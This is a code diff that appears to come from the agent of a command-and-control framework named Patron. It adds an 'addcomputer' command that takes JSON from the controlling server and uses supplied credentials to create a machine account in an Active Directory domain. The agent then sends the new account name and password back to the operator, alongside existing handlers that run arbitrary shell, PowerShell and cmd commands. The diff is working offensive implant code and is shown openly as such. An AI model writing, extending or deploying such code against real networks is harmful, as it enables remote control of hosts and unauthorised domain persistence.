@@ -7,6 +7,7 @@ import (
 	"crypto/tls"
 	"crypto/x509"
 	"encoding/base64"
+	"encoding/json"
 	"fmt"
 	"io"
 	"net"
@@ -28,6 +29,9 @@ import (
 	"github.com/PatronC2/Patron/Patronobuf/go/patronobuf"
 	"github.com/PatronC2/Patron/lib/common"
 	"github.com/PatronC2/Patron/lib/logger"
+	"github.com/PatronC2/Patron/types"
+	"github.com/PatronC2/gopacket/lib/addcomputer"
+	"github.com/PatronC2/gopacket/pkg/session"
 )
 
 type Config struct {
@@ -154,6 +158,31 @@ func RunTypedCommand(commandType string, command string) string {
 		} else {
 			cmd = exec.Command("bash", "-c", command)
 		}
+	case "addcomputer":
+		var addCmd types.AddComputerCommand
+		if err := json.Unmarshal([]byte(command), &addCmd); err != nil {
+			return fmt.Sprintf("failed to parse addcomputer command JSON: %v", err)
+		}
+
+		target, creds, err := session.ParseTargetString(addCmd.Target)
+		if err != nil {
+			return fmt.Sprintf("failed to parse target: %v", err)
+		}
+
+		res, err := addcomputer.Run(target, creds, addcomputer.Options{
+			Method:        addcomputer.Method(addCmd.Method),
+			Action:        addcomputer.Action(addCmd.Action),
+			ComputerName:  addCmd.ComputerName,
+			ComputerPass:  addCmd.ComputerPass,
+			BaseDN:        addCmd.BaseDN,
+			ComputerGroup: addCmd.ComputerGroup,
+			DomainNetBIOS: addCmd.DomainNetBIOS,
+		})
+		if err != nil {
+			return fmt.Sprintf("addcomputer failed: %v", err)
+		}
+
+		return fmt.Sprintf("computer=%s password=%s", res.SAMAccount, res.Password)
 	default:
 		return fmt.Sprintf("Unsupported command type: %s", commandType)
 	}
@@ -684,7 +713,7 @@ func executeCommandRequest(cmd *patronobuf.CommandResponse) *patronobuf.CommandS
 
 	var output, result string
 	switch cmd.GetCommandtype() {
-	case "shell", "sh", "bash", "powershell", "cmd":
+	case "shell", "sh", "bash", "powershell", "cmd", "addcomputer":
 		output = RunTypedCommand(cmd.GetCommandtype(), cmd.GetCommand())
 		result = "1"
 	case "kill":
